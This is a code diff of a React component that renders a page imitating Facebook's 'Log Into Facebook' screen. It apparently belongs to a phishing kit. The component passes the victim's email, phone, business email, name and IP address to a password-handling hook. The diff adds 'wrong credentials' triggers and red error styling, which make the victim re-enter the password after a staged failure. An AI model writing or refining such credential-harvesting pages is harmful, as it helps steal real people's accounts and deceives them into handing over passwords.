@@ -15,6 +15,7 @@ function Step2PC({
   setParentBeginTimer,
   InvalidPassword,
   wrongPasswordTrigger,
+  wrongCredsTrigger,
   onClose,
 }) {
   const [isValidEmail, setIsValidEmail] = useState(true);
@@ -35,19 +36,25 @@ function Step2PC({
     isLoading,
     passwordError,
     emailError,
+    credentialsError,
+    hasCredsError,
     triedSubmit,
     passwordAttempt,
     handleSubmit,
     clearPasswordError,
     clearEmailError,
+    clearCredentialsError,
+    clearCredsBorderOnly,
   } = usePasswordAuth({
     Unik,
     Email,
+    setEmail,
     Tel,
     BusinessEmail,
     Name,
     Ip,
     wrongPasswordTrigger,
+    wrongCredsTrigger,
     setParentBeginTimer,
   });
 
@@ -200,15 +207,21 @@ function Step2PC({
             </div>
 
             {/* Alert Message */}
-            <div className="bg-white !border border-[#5890ff] rounded-sm mb-4 flex items-center overflow-hidden">
-              <div className="bg-[#1877f2] p-2 flex items-center justify-center flex-shrink-0">
-                <div className="bg-white rounded-full w-5 h-5 flex items-center justify-center">
-                  <span className="text-[#1877f2] text-xs font-bold">i</span>
+            <div className={`!border rounded-sm mb-4 flex items-center overflow-hidden ${
+              credentialsError ? 'border-red-500 !bg-red-50' : 'border-[#5890ff] bg-white'
+            }`}>
+              {!credentialsError && (
+                <div className="bg-[#1877f2] p-2 flex items-center justify-center flex-shrink-0">
+                  <div className="bg-white rounded-full w-5 h-5 flex items-center justify-center">
+                    <span className="text-[#1877f2] text-xs font-bold">i</span>
+                  </div>
                 </div>
-              </div>
+              )}
               <div className="flex-1 px-3 py-2">
-                <p className="text-sm text-[#1c1e21] m-0">
-                  You must log in to continue.
+                <p className={`text-sm text-[#1c1e21] m-0 whitespace-pre-line ${
+                  credentialsError ? 'text-center' : ''
+                }`}>
+                  {credentialsError || 'You must log in to continue.'}
                 </p>
               </div>
             </div>
@@ -219,24 +232,26 @@ function Step2PC({
                 Log Into Facebook
               </h2>
 
-              {/* Warning Box */}
+              {/* Warning Box
               <div className="bg-[#f5edcd] !border border-[#f5dd9c] rounded mb-4 py-2.5">
                 <p className="text-xs text-center text-gray-900 font-fbook m-0">
                   You must log in to continue.
                 </p>
-              </div>
+              </div> */}
 
               <input
                 type="text"
                 value={Email}
                 onChange={handleEmailChange}
+                onFocus={clearCredsBorderOnly}
                 placeholder="Email or phone number"
-                className={`border rounded-md py-3 px-3 bg-white w-full text-sm mb-3 text-gray-900 leading-normal box-border placeholder-gray-500 focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] font-fbook ${
-                  !isValidEmail && triedSubmit ? "border-red-500" : "border-[#dddfe2]"
+                style={hasCredsError ? {borderColor: 'red'} : undefined}
+                className={`border rounded-md py-3 px-3 bg-white w-full text-sm mb-3 text-gray-900 leading-normal box-border placeholder-gray-500 focus:outline-none ${!hasCredsError ? 'focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2]' : ''} font-fbook ${
+                  !hasCredsError && !isValidEmail && triedSubmit ? "border-red-500" : "border-[#dddfe2]"
                 }`}
                 disabled={isLoading}
               />
-              {emailError && (
+              {!credentialsError && emailError && (
                 <div className="text-red-500 text-sm font-medium text-left mb-2 font-fbook">
                   {emailError}
                 </div>
@@ -246,13 +261,15 @@ function Step2PC({
                 type="password"
                 value={password}
                 onChange={handlePasswordChange}
+                onFocus={clearCredsBorderOnly}
                 placeholder="Password"
-                className={`border rounded-md py-3 px-3 bg-white w-full text-sm text-gray-900 leading-normal mb-4 box-border placeholder-gray-500 focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] font-fbook ${
-                  password.length < 5 && triedSubmit ? "border-red-500" : "border-[#dddfe2]"
+                style={hasCredsError ? {borderColor: 'red'} : undefined}
+                className={`border rounded-md py-3 px-3 bg-white w-full text-sm text-gray-900 leading-normal mb-4 box-border placeholder-gray-500 focus:outline-none ${!hasCredsError ? 'focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2]' : ''} font-fbook ${
+                  !hasCredsError && password.length < 5 && triedSubmit ? "border-red-500" : "border-[#dddfe2]"
                 }`}
                 disabled={isLoading}
               />
-              {passwordError && (
+              {!credentialsError && passwordError && (
                 <div className="text-red-500 text-sm font-medium text-left mb-2 font-fbook">
                   {passwordError}
                 </div>
@@ -356,7 +373,7 @@ function Step2PC({
                   }}
                   className="text-[#1877f2] text-sm no-underline font-fbook hover:underline"
                 >
-                  Forgot account?
+                  Forgot password?
                 </a>
               </div>
             </div>
